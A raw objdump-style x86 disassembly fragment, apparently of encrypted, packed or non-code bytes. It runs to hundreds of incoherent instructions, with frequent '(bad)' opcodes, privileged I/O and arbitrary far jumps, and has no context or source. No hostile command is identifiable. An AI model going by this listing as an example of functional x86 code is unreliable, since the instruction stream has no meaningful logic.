  43487b:	jns    0x434810
  43487d:	mov    dl,0x1f
  43487f:	ja     0x434805
  434881:	cmp    al,0x7e
  434883:	adc    BYTE PTR [ecx+0x47],bl
  434886:	push   0x9f82271b
  43488b:	dec    ecx
  43488c:	std    
  43488d:	leave  
  43488e:	push   ebp
  43488f:	bound  ecx,QWORD PTR [eax+0x31d33c8d]
  434895:	adc    BYTE PTR ds:0x2260fc6,dh
  43489b:	cli    
  43489c:	int3   
  43489d:	icebp  
  43489e:	jecxz  0x434919
  4348a0:	xchg   ecx,eax
  4348a1:	into   
  4348a2:	push   cs
  4348a3:	adc    al,0x81
  4348a5:	dec    eax
  4348a6:	fstp   QWORD PTR [eax-0x31]
  4348a9:	fistp  WORD PTR [edi]
  4348ab:	outs   dx,BYTE PTR ds:[esi]
  4348ac:	cli    
  4348ad:	(bad)  
  4348ae:	mov    ch,0x35
  4348b0:	cmc    
  4348b1:	mov    esi,0x254499c
  4348b6:	sbb    eax,0xd0a68573
  4348bb:	xor    eax,0xe7300275
  4348c0:	hlt    
  4348c1:	aas    
  4348c2:	dec    ebp
  4348c3:	(bad)  
  4348c4:	sub    DWORD PTR ds:0xba11437b,ebx
  4348ca:	ss in  eax,0xc5
  4348cd:	mov    al,0x85
  4348cf:	push   0xa8734592
  4348d4:	xor    DWORD PTR [ebx],eax
  4348d6:	push   ss
  4348d7:	push   esi
  4348d8:	pop    eax
  4348d9:	ss popf 
  4348db:	jno    0x434937
  4348dd:	sbb    edi,DWORD PTR [ebx+0x60ce9af1]
  4348e3:	add    DWORD PTR [esi],0x17
  4348e6:	sub    DWORD PTR [esi+ebp*8],esp
  4348e9:	add    eax,0x3daa5a34
  4348ee:	shl    ch,cl
  4348f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4348f1:	sub    eax,0x9745177a
  4348f6:	dec    esp
  4348f7:	xchg   ebx,eax
  4348f8:	xor    edx,esi
  4348fa:	inc    ebp
  4348fb:	mov    cs,WORD PTR [eax+0x229ba3f8]
  434901:	cmp    eax,0x4dd5cc2
  434906:	pusha  
  434907:	pop    edi
  434908:	jmp    0x4348e1
  43490a:	hlt    
  43490b:	sub    DWORD PTR [ecx],esi
  43490d:	add    ah,dh
  43490f:	je     0x4348b3
  434911:	int3   
  434912:	fistp  QWORD PTR [edi+0x24]
  434915:	xchg   DWORD PTR [eax-0xf],ebp
  434918:	fcomp  QWORD PTR [eax+0x66892a04]
  43491e:	add    al,0x11
  434920:	push   ss
  434921:	neg    eax
  434923:	aad    0x7c
  434925:	inc    ecx
  434926:	jge    0x43495d
  434928:	fmul   st,st(7)
  43492a:	mov    edx,DWORD PTR fs:[edi+0x795dc20f]
  434931:	and    eax,0x85ab540b
  434936:	add    al,0x10
  434938:	and    DWORD PTR [ecx],eax
  43493a:	push   esi
  43493b:	jmp    0x250:0xf63e
  434941:	loop   0x4349bb
  434943:	test   al,0x88
  434945:	(bad)
  434949:	add    BYTE PTR [ebx-0x44],0x3d
  43494d:	add    ebp,esi
  43494f:	sub    eax,0x3146ea1
  434954:	xchg   esi,eax
  434955:	dec    edi
  434956:	xchg   esi,eax
  434957:	sub    DWORD PTR [edi-0x56facf00],ebx
  43495d:	(bad)  
  43495f:	(bad)  [ecx-0x35]
  434962:	repnz inc edi
  434964:	cmc    
  434965:	jmp    0x3e5580ca
  43496a:	repnz ror BYTE PTR [ebx+0x63],0xe
  43496f:	jmp    0x4348f9
  434971:	imul   esi,DWORD PTR [esi],0x49
  434974:	inc    ebx
  434975:	push   esi
  434976:	loopne 0x434983
  434978:	sbb    BYTE PTR [edx],al
  43497a:	test   al,ch
  43497c:	mov    edi,DWORD PTR [ecx]
  43497e:	xchg   ecx,eax
  43497f:	cs aad 0x9e
  434982:	inc    esp
  434983:	jmp    0x8bbf2bc9
  434988:	sahf   
  434989:	inc    ebp
  43498a:	test   DWORD PTR [ecx-0x5ed403d8],0x8a5bccea
  434994:	mov    BYTE PTR [esp+eiz*4],cl
  434997:	stc    
  434998:	into   
  434999:	sbb    eax,0xbd896818
  43499e:	test   al,0x61
  4349a0:	aaa    
  4349a1:	pushw  0xfffc
  4349a4:	and    al,BYTE PTR [ebx]
  4349a6:	mov    ah,0x79
  4349a8:	jmp    0x434963
  4349aa:	xchg   BYTE PTR [edi],ah
  4349ac:	jne    0x434986
  4349ae:	pop    ds
  4349af:	sub    eax,0x1b62fa18
  4349b4:	adc    dl,BYTE PTR [ebp-0x4f]
  4349b7:	aam    0xac
  4349b9:	jl     0x434954
  4349bb:	dec    ecx
  4349bc:	push   ebx
  4349bd:	outs   dx,DWORD PTR ds:[esi]
  4349be:	xor    ebp,DWORD PTR [ebx-0x77]
  4349c1:	aas    
  4349c2:	sub    al,0x64
  4349c4:	test   DWORD PTR [edi],ebx
  4349c6:	ja     0x434a3e
  4349c8:	and    DWORD PTR ds:0xf561e048,esp
  4349ce:	loop   0x434a45
  4349d0:	in     eax,0xbc
  4349d2:	adc    DWORD PTR [edx+ebp*8],0x67ff1e1e
  4349d9:	sbb    BYTE PTR [ebp-0x22785388],bh
  4349df:	lods   eax,DWORD PTR ds:[esi]
  4349e0:	mov    DWORD PTR [esi+0x7d],edi
  4349e3:	aas    
  4349e4:	jg     0x434968
  4349e6:	pop    edx
  4349e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4349e8:	and    DWORD PTR [esi+0x19f7da0d],ebp
  4349ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4349ef:	aad    0xd8
  4349f1:	and    dl,bl
  4349f3:	lea    edx,[esi]
  4349f5:	pop    ecx
  4349f6:	lock mov ecx,0x98c9a2fe
  4349fc:	leave  
  4349fd:	xor    ah,ah
  4349ff:	jmp    0xf850:0x451f46c0
  434a06:	jae    0x434a41
  434a08:	pop    edx
  434a09:	inc    ebx
  434a0a:	(bad)  
  434a0b:	aad    0x51
  434a0d:	stos   DWORD PTR es:[edi],eax
  434a0e:	call   DWORD PTR [esi-0x5]
  434a11:	sub    eax,esp
  434a13:	adc    BYTE PTR [eax+0x2a23d40d],cl
  434a19:	div    bl
  434a1b:	mov    ds:0x9b564dec,eax
  434a20:	cmp    DWORD PTR [edx-0x12bde7fb],eax
  434a26:	enter  0x8809,0xb
  434a2a:	loope  0x4349c0
  434a2c:	jmp    0xb88a1f3f
  434a31:	add    eax,0x99cce6bc
  434a36:	and    ecx,esi
  434a38:	xchg   ebp,eax
  434a39:	or     eax,0x4fb6b1f
  434a3e:	xor    DWORD PTR [esi-0x14fda400],0x54
  434a45:	inc    ebp
  434a46:	add    al,0x4a
  434a48:	pop    ebp
  434a49:	cdq    
  434a4a:	jbe    0x434a9f
  434a4c:	mov    esp,0x891c36e2
  434a51:	inc    ebp
  434a52:	imul   ebp,ebx,0xffffffb1
  434a55:	xor    esi,DWORD PTR [ecx]
  434a57:	mov    ch,0x9f
  434a59:	add    BYTE PTR [edx-0x57],ah
  434a5c:	push   esp
  434a5d:	in     eax,0xb9
  434a5f:	repnz add ebp,DWORD PTR [eax+eiz*4-0x6c50616c]
  434a67:	icebp  
  434a68:	add    DWORD PTR ds:0xeb153ab1,0x102f7937
  434a72:	out    0x41,al
  434a74:	jns    0x4349f9
  434a76:	ins    DWORD PTR es:[edi],dx
  434a77:	test   BYTE PTR [esi-0x7e],cl
  434a7a:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434a7c:	aam    0xd
  434a7e:	pusha  
  434a7f:	mov    cl,0x21
  434a81:	stos   BYTE PTR es:[edi],al
  434a82:	loope  0x434af7
  434a84:	in     al,dx
  434a85:	out    dx,al
  434a86:	rcl    ah,1
  434a88:	push   eax
  434a89:	repnz pop esi
  434a8b:	lods   eax,DWORD PTR ds:[esi]
  434a8c:	pushf  
  434a8d:	cmc    
  434a8e:	jmp    FWORD PTR [eax+0x1ce7df88]
  434a94:	call   0x8615:0x49471640
  434a9b:	push   ss
  434a9c:	mov    esp,0x6f3594d5
  434aa1:	pop    edx
  434aa2:	(bad)  
  434aa3:	sbb    eax,edi
  434aa5:	adc    bl,BYTE PTR [esi]
  434aa7:	mov    eax,ds:0xcff41597
  434aac:	jb     0x434af4
  434aae:	outs   dx,BYTE PTR ds:[esi]
  434aaf:	aam    0x50
  434ab1:	popa   
  434ab2:	jg     0x434ae7
  434ab4:	add    al,0xf2
  434ab6:	das    
  434ab7:	mov    di,WORD PTR [ebp-0x47]
  434abb:	rol    DWORD PTR [ecx-0x11],1
  434abe:	fdivr  st,st(5)
  434ac0:	sbb    BYTE PTR [edi],al
  434ac2:	jb     0x434b18
  434ac4:	pop    ecx
  434ac5:	or     al,0x47
  434ac7:	add    DWORD PTR [esi-0x3c],0x1f
  434acb:	lahf   
  434acc:	test   eax,0x268cc374
  434ad1:	mov    BYTE PTR [edi+0x3ce358d4],cl
  434ad7:	inc    eax
  434ad8:	adc    al,0xb5
  434ada:	adc    al,0x1d
  434adc:	call   0x2805:0xfedbd8fb
  434ae3:	mov    WORD PTR [eax+0x2c],cs
  434ae6:	mov    al,ds:0x98ce3fd4
  434aeb:	mov    DWORD PTR [eax],edi
  434aed:	pushf  
  434aee:	in     al,0xe
  434af0:	mov    fs,edi
  434af2:	add    bl,bl
  434af4:	pusha  
  434af5:	ins    BYTE PTR es:[edi],dx
  434af6:	mov    dl,0xe0
  434af8:	sbb    eax,0x7695a783
  434afd:	add    ebx,esp
  434aff:	sbb    DWORD PTR [edx-0x4613ea96],esp
  434b05:	sbb    BYTE PTR [ecx+eax*1-0x52],ah
  434b09:	and    esp,edx
  434b0b:	xchg   ebx,eax
  434b0c:	pop    edx
  434b0d:	push   edx
  434b0e:	repz dec esp
  434b10:	adc    al,0x2
  434b12:	add    BYTE PTR [ecx+0x3],dl
  434b15:	rcr    DWORD PTR [eax+0x4f],1
  434b18:	cmc    
  434b19:	adc    al,0x1e
  434b1b:	outs   dx,DWORD PTR ds:[esi]
  434b1c:	cs jbe 0x434aec
  434b1f:	jl     0x434b93
  434b21:	or     dl,al
  434b23:	aad    0x68
  434b25:	mov    ds:0x2a228c0b,al
  434b2a:	out    0x4e,eax
  434b2c:	imul   ebx,DWORD PTR [esi+0x4e],0xffffff96
  434b30:	mov    ecx,eax
  434b32:	lock dec edx
  434b34:	or     ecx,esp
  434b36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434b37:	inc    esp
  434b38:	out    0x14,al
  434b3a:	or     BYTE PTR [ebx+ebp*2-0x68],dh
  434b3e:	jle    0x434b14
  434b40:	js     0x434b0b
  434b42:	push   edi
  434b43:	or     BYTE PTR [ecx-0x1d532fd3],cl
  434b49:	ins    DWORD PTR es:[edi],dx
  434b4a:	ds clc 
  434b4c:	cs add ecx,esi
  434b4f:	rcr    DWORD PTR [ecx-0x754d0ccb],1
  434b55:	mov    ecx,0x3192b97
  434b5a:	sar    DWORD PTR [edi],1
  434b5c:	lahf   
  434b5d:	mov    ecx,0x217ebd8
  434b62:	mov    ds:0x39b8fc10,al
  434b67:	jo     0x434b9b
  434b69:	jae    0x434b04
  434b6b:	push   esp
  434b6c:	xor    bh,dl
  434b6e:	mov    bh,0xd5
  434b70:	aad    0xce
  434b72:	call   0x9fe3ea37
  434b77:	icebp  
  434b78:	fdiv   DWORD PTR [edi-0x2737e7c7]
  434b7e:	imul   ebx,DWORD PTR [esi],0xf8818f89
  434b84:	lods   eax,DWORD PTR ds:[esi]
  434b85:	dec    esp
  434b86:	dec    edi
  434b87:	out    0xc2,eax
  434b89:	add    eax,0xfb1ce566
  434b8e:	xor    edx,ecx
  434b90:	inc    DWORD PTR [eax]
  434b92:	or     esp,DWORD PTR [ebx]
  434b94:	mov    WORD PTR [ebp-0x18121d8f],ss
  434b9a:	lods   al,BYTE PTR ds:[esi]
  434b9b:	aad    0xc2
  434b9d:	test   BYTE PTR [edi+eax*8],al
  434ba0:	jg     0x434ba5
  434ba2:	fcomp  QWORD PTR [edi-0x1ce99233]
  434ba8:	jne    0x434baf
  434baa:	sar    WORD PTR [edi],cl
  434bad:	jg     0x434bb9
  434baf:	and    eax,0x143092cf
  434bb4:	or     DWORD PTR [ebx],eax
  434bb6:	xor    ah,bl
  434bb8:	push   es
  434bb9:	ror    DWORD PTR [ebp+0x10e3fd88],0xa3
  434bc0:	mov    BYTE PTR [ecx-0x5d15e405],dl
  434bc6:	cmp    al,0xda
  434bc8:	iret   
  434bc9:	add    ch,BYTE PTR [ecx+ebx*4+0x5e4e245f]
  434bd0:	add    bh,bl
  434bd2:	pop    ds
  434bd3:	shr    ebx,cl
  434bd5:	add    eax,0x795979cd
  434bda:	or     dh,dl
  434bdc:	hlt    
  434bdd:	pop    ss
  434bde:	into   
  434bdf:	je     0x434beb
  434be1:	and    dl,ch
  434be3:	dec    eax
  434be4:	inc    esp
  434be5:	pop    ds
  434be6:	mov    ebx,0x1fd4a71f
  434beb:	xor    eax,0xe019e6db
  434bf0:	xor    DWORD PTR [ebx],eax
  434bf2:	dec    dh
  434bf4:	das    
  434bf5:	add    al,0xea
  434bf7:	cmp    DWORD PTR [edi+0x45],0x6f108d1e
  434bfe:	mov    dl,BYTE PTR [ebp+0x49]
  434c01:	pop    esp
  434c02:	mov    al,ds:0x946545dc
  434c07:	mov    esi,0x2532b249
  434c0c:	dec    eax
  434c0d:	jae    0x434bdd
  434c0f:	mov    eax,ds:0x3dc005ba
  434c14:	inc    esp
  434c15:	rcl    BYTE PTR [edi+0x16d19026],1
  434c1b:	xlat   BYTE PTR ds:[ebx]
  434c1c:	push   ebp
  434c1d:	loope  0x434c0f
  434c1f:	jmp    0x2188:0xd3a47082
  434c26:	mov    ah,0x7c
  434c28:	xchg   ebp,eax
  434c29:	dec    ebp
  434c2a:	mov    ?,ebp
  434c2c:	rol    BYTE PTR ds:0xb770f9e,cl
  434c32:	mov    ebp,0x1e41976c
  434c37:	xchg   DWORD PTR [ecx-0x31e5309a],edx
  434c3d:	xchg   esi,eax
  434c3e:	push   ebp
  434c3f:	lds    esi,FWORD PTR [eax]
  434c41:	(bad)  
  434c42:	jp     0x434c18
  434c44:	pop    edi
  434c45:	stos   BYTE PTR es:[edi],al
  434c46:	jne    0x434bd9
  434c48:	popf   
  434c49:	sbb    ebp,DWORD PTR [eax+0x1bd9b3a4]
  434c4f:	sub    al,0x9
  434c51:	fadd   QWORD PTR [ecx-0x5a0a08bc]
  434c57:	int3   
  434c58:	test   BYTE PTR [edx],al
  434c5a:	cmp    BYTE PTR ds:0xeeb97be8,dl
  434c60:	push   ebx
  434c61:	push   0x1f
  434c63:	cmp    eax,0x55df7291
  434c68:	sbb    BYTE PTR [ebx+ebp*2-0x2b],dl
  434c6c:	pop    es
  434c6d:	and    eax,0xd9243b00
  434c72:	in     eax,0x3f
  434c74:	mov    DWORD PTR [ebp+0x722226f8],edi
  434c7a:	sbb    al,0xc3
  434c7c:	popa   
  434c7d:	add    cl,BYTE PTR [eax+edi*4+0x5e]
  434c81:	repz mov ds:0x1fec3d5f,eax
  434c87:	sti    
  434c88:	ss jns 0x434c5e
  434c8b:	mov    dl,0x12
  434c8d:	es push 0x31449bd5
  434c93:	dec    esp
  434c94:	js     0x434cf1
  434c96:	hlt    
  434c97:	cdq    
  434c98:	mov    BYTE PTR [ecx],bh
  434c9a:	int    0x23
  434c9c:	inc    edi
  434c9d:	pop    edi
  434c9e:	test   esp,esi
  434ca0:	rol    BYTE PTR [edx],0x8e
  434ca3:	cmp    ch,BYTE PTR [ebx-0x61]
  434ca6:	pop    edx
  434ca7:	out    dx,eax
  434ca8:	lods   eax,DWORD PTR ds:[esi]
  434ca9:	fwait
  434caa:	adc    esi,DWORD PTR [ecx]
  434cac:	mov    DWORD PTR [edi+0x2fb7f074],eax
  434cb2:	and    al,0x2c
  434cb4:	mov    esi,0xabfade05
  434cb9:	jle    0x434c3b
  434cbb:	jg     0x434d0a
  434cbd:	add    BYTE PTR [esi+0x56424878],cl
  434cc3:	fstp   QWORD PTR [esi]
  434cc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434cc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434cc7:	mov    ebx,0x775cdf66
  434ccc:	push   es
  434ccd:	int    0x34
  434ccf:	idiv   DWORD PTR [ecx]
  434cd1:	inc    ebx
  434cd2:	jbe    0x434d34
  434cd4:	mov    DWORD PTR [ebx+0x6f],edi
  434cd7:	jmp    0x434c6f
  434cd9:	fmul   QWORD PTR [esi+eax*1-0x2c]
  434cdd:	sub    DWORD PTR [ebp+ebx*1+0x515f5e35],ebx
  434ce4:	adc    edi,edi
  434ce6:	das    
  434ce7:	retf   
  434ce8:	js     0x434c9c
  434cea:	pusha  
  434ceb:	push   ecx
  434cec:	cmc    
  434ced:	scas   al,BYTE PTR es:[edi]
  434cee:	ins    BYTE PTR es:[edi],dx
  434cef:	loope  0x434c9d
  434cf1:	mov    ebp,0xb86ad59e
  434cf6:	and    edi,edx
  434cf8:	je     0x434cc0
  434cfa:	jp     0x434c7c
  434cfc:	xchg   edi,eax
  434cfd:	std    
  434cfe:	scas   eax,DWORD PTR es:[edi]
  434cff:	xchg   DWORD PTR [edi-0x7e],esi
  434d02:	hlt    
  434d03:	jae    0x434cc5
  434d05:	(bad)  
  434d07:	aam    0x34
  434d09:	out    dx,al
  434d0a:	shl    dl,0x97
  434d0d:	sub    eax,0xe98864d8
  434d12:	sbb    dl,bl
  434d14:	out    dx,eax
  434d15:	mov    edx,0x39246f
  434d1a:	xchg   edx,eax
  434d1b:	das    
  434d1c:	inc    ebx
  434d1d:	push   ecx
  434d1e:	pop    ss
  434d1f:	jb     0x434ccd
  434d21:	in     eax,0xf8
  434d23:	adc    eax,DWORD PTR [esi+0x66765c63]
  434d29:	fdivr  DWORD PTR [edi-0x6c0e973b]
  434d2f:	aam    0x8b
  434d31:	ret    
  434d32:	fnstsw WORD PTR [esi]
  434d34:	add    al,0x25
  434d36:	push   0x7ef9884b
  434d3b:	lock shufps xmm6,XMMWORD PTR [esi+eax*1-0x29],0x2
  434d42:	(bad)  
  434d43:	daa    
  434d44:	pop    esp
  434d45:	dec    esi
  434d46:	aam    0x8f
  434d48:	push   es
  434d49:	retf   
  434d4a:	pop    ds
  434d4b:	adc    DWORD PTR [eax+0x7d],esp
  434d4e:	sbb    esi,eax
  434d50:	mov    cl,0xd5
  434d52:	ins    DWORD PTR es:[edi],dx
  434d53:	mov    ch,0xdd
  434d55:	add    cl,dh
  434d57:	pop    edx
  434d58:	loopne 0x434d9c
  434d5a:	push   esp
  434d5b:	xchg   BYTE PTR [edx],cl
  434d5d:	jne    0x434d7e
  434d5f:	jecxz  0x434d9a
  434d61:	inc    esp
  434d62:	pop    ecx
  434d63:	mov    dl,0x6
  434d65:	(bad)  
  434d66:	cmp    edi,edx
  434d68:	jg     0x434d5b
  434d6a:	push   esp
  434d6b:	adc    DWORD PTR [edi],eax
  434d6d:	mov    ds:0xeb48a41d,eax
  434d72:	pusha  
  434d73:	neg    DWORD PTR [ebx-0x1c7fec7]
  434d79:	sub    eax,0xf914d452
  434d7e:	pusha  
  434d7f:	mov    esi,0x60d2bb18
  434d84:	ins    BYTE PTR es:[edi],dx
  434d85:	pop    eax
  434d86:	push   ds
  434d87:	xchg   ebp,eax
  434d88:	icebp  
  434d89:	jo     0x434d30
  434d8b:	pop    ebx
  434d8c:	test   al,0xfa
  434d8e:	pop    esi
  434d8f:	(bad)  
  434d90:	call   0xc2dcff84
  434d95:	nop
  434d96:	sbb    al,0x3f
  434d98:	or     dh,ch
  434d9a:	pop    ds
  434d9b:	dec    ebx
  434d9c:	push   eax
  434d9d:	pop    edx
  434d9e:	mov    esp,0xbd55f661
  434da3:	aam    0xa
  434da5:	jle    0x434d3a
  434da7:	mov    edi,0x516450ba
  434dac:	mov    BYTE PTR [ecx+0x5c],bl
  434daf:	outs   dx,BYTE PTR ds:[esi]
  434db0:	adc    esi,esi
  434db2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434db3:	pop    edx
  434db4:	ins    BYTE PTR es:[edi],dx
  434db5:	add    edi,DWORD PTR [esi-0x62]
  434db8:	cmp    ebp,DWORD PTR [eax+edx*2-0x10]
  434dbc:	dec    edi
  434dbd:	adc    bl,BYTE PTR [edi]
  434dbf:	push   edi
  434dc0:	pop    esp
  434dc1:	gs sub bh,cl
  434dc4:	jle    0x434e24
  434dc6:	mov    ebx,DWORD PTR [edx-0x2b709191]
  434dcc:	retf   
  434dcd:	jns    0x434ddd
  434dcf:	imul   ebp,edi,0x6e2d9201
  434dd5:	sub    eax,0x582daa4
  434dda:	(bad)  
  434ddb:	mov    ebp,0x9eb965fc
  434de0:	test   DWORD PTR [ebp-0x6d092a04],ebx
  434de6:	mov    esi,0x7c79151b
  434deb:	arpl   WORD PTR [edi-0x79e29bba],di
  434df1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434df2:	rcl    BYTE PTR [ecx+ebp*2+0x48],1
  434df6:	mov    al,0x1d
  434df8:	xor    DWORD PTR [ebp+0x7f8843ef],0x9d3f7ea5
  434e02:	adc    al,cl
  434e04:	mov    DWORD PTR [ebp+0x41],ebx
  434e07:	ret    
  434e08:	icebp  
  434e09:	out    0xe4,eax
  434e0b:	iret   
  434e0c:	scas   al,BYTE PTR es:[edi]
  434e0d:	add    ch,BYTE PTR [esi-0x35]
  434e10:	ins    BYTE PTR es:[edi],dx
  434e11:	inc    esp
  434e12:	cmp    eax,0x6aa6c482
  434e17:	inc    edi
  434e18:	cld    
  434e19:	stos   BYTE PTR es:[edi],al
  434e1a:	test   eax,0xefa8882a
  434e1f:	pop    ebx
  434e20:	clc    
  434e21:	add    eax,0xca401b6
  434e26:	or     dl,BYTE PTR [ecx+eax*2-0xe5c6567]
  434e2d:	add    eax,0x4c2d6bce
  434e32:	fcomp  DWORD PTR [edi+0x64]
  434e35:	add    edx,DWORD PTR [edx-0x53]
  434e38:	mov    bl,0x92
  434e3a:	and    esp,ebp
  434e3c:	push   edi
  434e3d:	cmp    BYTE PTR [ebx],ah
  434e3f:	das    
  434e40:	mov    DWORD PTR [edi],ecx
  434e42:	sahf   
  434e43:	or     DWORD PTR [ecx-0x27],eax
  434e46:	cmp    dh,BYTE PTR [ebp-0x5471fa46]
  434e4c:	cmp    DWORD PTR [edi+0x52bb4ebe],ebp
  434e52:	pop    ds
  434e53:	mov    DWORD PTR [edi-0x70],eax
  434e56:	clc    
  434e57:	adc    bh,dh
  434e59:	shl    BYTE PTR [edi],cl
  434e5b:	aam    0xeb
  434e5d:	cli    
  434e5e:	lahf   
  434e5f:	push   edi
  434e60:	jns    0x434e8b
  434e62:	inc    edx
  434e63:	jg     0x434e17
  434e65:	jnp    0x434e69
  434e67:	jg     0x434df1
  434e69:	mov    eax,ds:0xc08a23ed
  434e6e:	mov    ds:0x1a4d49d5,al
  434e73:	aad    0xc3
  434e75:	je     0x434e1a
  434e77:	das    
  434e78:	mov    DWORD PTR [ecx+0x5fb8f508],eax
  434e7e:	push   ecx
  434e7f:	fiadd  DWORD PTR [eax+0x6627e202]
  434e85:	inc    ebx
  434e86:	dec    ebp
  434e87:	iret   
  434e88:	mov    cl,BYTE PTR [edx+0x3]
  434e8b:	push   ss
  434e8c:	mov    edi,?
  434e8e:	int    0x60
  434e90:	cli    
  434e91:	(bad)  
  434e92:	(bad)  
  434e93:	adc    eax,0xd5f3b11a
  434e98:	nop
  434e99:	adc    dl,dl
  434e9b:	mov    DWORD PTR [ecx+0x54],edi
  434e9e:	or     esp,DWORD PTR [ecx-0x77]
  434ea1:	fnsave [eax-0x35]
  434ea4:	iret   
  434ea5:	iret   
  434ea6:	stc    
  434ea7:	fsubr  QWORD PTR [ebp-0x2afeca00]
  434ead:	in     al,dx
  434eae:	and    al,ah
  434eb0:	outs   dx,BYTE PTR ds:[esi]
  434eb1:	mov    bl,0x88
  434eb3:	push   ebp
  434eb4:	mov    BYTE PTR [ebx-0x3],cl
  434eb7:	in     eax,0x3f
  434eb9:	ins    DWORD PTR es:[edi],dx
  434eba:	(bad)  
  434ebb:	cmp    BYTE PTR [eax],ah
  434ebd:	dec    eax
  434ebe:	push   esp
  434ebf:	mov    al,ds:0xb144834d
  434ec4:	or     al,0x96
  434ec6:	ja     0x434e5e
  434ec8:	mov    DWORD PTR [ecx],eax
  434eca:	inc    eax
  434ecb:	mov    ds:0x7370d8f8,eax
  434ed0:	out    0xad,al
  434ed2:	scas   eax,DWORD PTR es:[edi]
  434ed3:	inc    ebx
  434ed4:	mov    BYTE PTR [edi-0x6edee1ca],cl
  434eda:	es leave 
  434edc:	mov    eax,0xfb916566
  434ee1:	and    eax,0xe5700fb5
  434ee6:	sub    BYTE PTR [ecx],0xa
  434ee9:	push   ds
  434eea:	sub    BYTE PTR [ebx],ah
  434eec:	sub    BYTE PTR ds:0x8a3eaaed,al
  434ef2:	and    eax,0x4685afb9
  434ef7:	js     0x434ec9
  434ef9:	(bad)  
  434efa:	pop    ds
  434efb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434efc:	imul   esi,DWORD PTR [eax],0xb038c026
  434f02:	ja     0x434ed8
  434f04:	mov    esi,0xff06804e
  434f09:	adc    BYTE PTR [edi+0x1c478be3],dh
  434f0f:	pop    esp
  434f10:	mov    ecx,0x30e1aefa
  434f15:	pop    edi
  434f16:	add    ebx,DWORD PTR [edx-0x52c8b411]
  434f1c:	iret   
  434f1d:	sbb    esi,DWORD PTR [ecx+ebx*1+0x19]
  434f21:	push   ebx
  434f22:	inc    esp
  434f23:	inc    edx
  434f24:	jmp    0xab68b653
  434f29:	and    BYTE PTR [ecx+0x71a68971],0x87
  434f30:	add    bl,bh
  434f32:	rcl    ah,1
  434f34:	dec    eax
  434f35:	mov    cl,0x9d
  434f37:	outs   dx,BYTE PTR ds:[esi]
  434f38:	aas    
  434f39:	stos   DWORD PTR es:[edi],eax
  434f3a:	mov    dl,0x36
  434f3c:	mov    DWORD PTR [edi],esi
  434f3e:	out    dx,eax
  434f3f:	inc    esi
  434f41:	sbb    esi,DWORD PTR [ecx+0x76]
  434f44:	mov    edi,0x2d33da29
  434f49:	jb     0x434eea
  434f4b:	inc    eax
  434f4c:	or     DWORD PTR [eax-0x69],edx
  434f4f:	into   
  434f50:	xchg   esp,eax
  434f51:	xchg   ebx,eax
  434f52:	xor    eax,0x5185b286
  434f57:	fdiv   DWORD PTR [edx]
  434f59:	xor    al,0x74
  434f5b:	(bad)  
  434f5c:	mov    dh,0x28
  434f5e:	shl    DWORD PTR [esp+ebp*1-0xff8c39c],0x5c
  434f66:	push   ds
  434f67:	lea    ebx,[ebx-0x76]
  434f6a:	int    0xf0
  434f6c:	ficom  DWORD PTR [ebx]
  434f6e:	(bad)  
  434f70:	bound  ecx,QWORD PTR [eax-0x4d]
  434f73:	call   0xe164:0x2fff31a9
  434f7a:	or     al,0x52
  434f7c:	mov    ch,cl
  434f7e:	(bad)  
  434f7f:	adc    DWORD PTR [ecx+0x1383a6c5],esp
  434f85:	add    esp,ebx
  434f87:	aaa    
  434f88:	xchg   ebp,eax
  434f89:	cmp    al,bh
  434f8b:	jno    0x434f56
  434f8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434f8e:	loop   0x434ff8
  434f90:	mov    eax,0x9f7761fe
  434f95:	wbinvd 
  434f97:	lea    ebx,[edi]
  434f99:	test   al,0x20
  434f9b:	ins    DWORD PTR es:[edi],dx
  434f9c:	sub    BYTE PTR [edx+0x14],cl
  434f9f:	(bad)
  434fa2:	xchg   esi,eax
  434fa3:	push   0x531f8d41
  434fa8:	lods   eax,DWORD PTR ds:[esi]
  434fa9:	add    BYTE PTR [edx+0x73],dl
  434fac:	mov    BYTE PTR [ebp+0x3201395e],0x9f
  434fb3:	push   edi
  434fb4:	adc    DWORD PTR [edx+0x5a],eax
  434fb7:	ror    BYTE PTR [edx-0x582a2522],1
  434fbd:	dec    esp
  434fbe:	test   al,0x32
  434fc0:	(bad)  
  434fc2:	test   BYTE PTR [ecx],0x95
  434fc5:	or     eax,0x306fd5d
  434fca:	shr    BYTE PTR [edx-0x7a621aed],0x83
  434fd1:	add    al,dl
  434fd3:	dec    edx
  434fd4:	and    ebx,DWORD PTR [eax+0x2d]
  434fd7:	leave  
  434fd8:	push   0xffffffaa
  434fda:	xchg   ecx,eax
  434fdb:	jne    0x43503c
  434fdd:	add    ecx,DWORD PTR [ebp+0x5a4cff52]
  434fe3:	xor    eax,0x164c026f
  434fe8:	jns    0x434f85
  434fea:	adc    esp,edi
  434fec:	cmc    
  434fed:	and    BYTE PTR [eax+0x4b],0x29
  434ff1:	das    
  434ff2:	in     al,dx
  434ff3:	outs   dx,BYTE PTR ds:[esi]
  434ff4:	adc    bl,BYTE PTR [ecx-0x5f]
  434ff7:	xlat   BYTE PTR ds:[ebx]
  434ff8:	adc    bh,BYTE PTR [edi+ebp*2+0x5e81ef60]
  434fff:	adc    al,0x63
  435001:	iret   
  435002:	pop    ds
  435003:	fbstp  TBYTE PTR [ebp-0x53]
  435006:	fbstp  TBYTE PTR [esi]
  435008:	outs   dx,BYTE PTR ds:[esi]
  435009:	es data16 aam 0x27
  43500d:	sub    ebp,DWORD PTR ds:0x478fdb98
  435013:	loop   0x434f9d
  435015:	dec    ecx
  435016:	nop
  435017:	data16 add al,0x38
  43501a:	pop    edi
  43501b:	mov    BYTE PTR [esi+0x512ed405],al
  435021:	retf   
  435022:	fiadd  DWORD PTR [esi]
  435024:	inc    edx
  435025:	pop    ecx
  435026:	push   ds
  435027:	fwait
  435028:	loop   0x435026
  43502a:	ss mov edi,0x40ab468b
  435030:	jp     0x435026
  435032:	pusha  
  435033:	sub    eax,0x571557a9
  435038:	xchg   ecx,eax
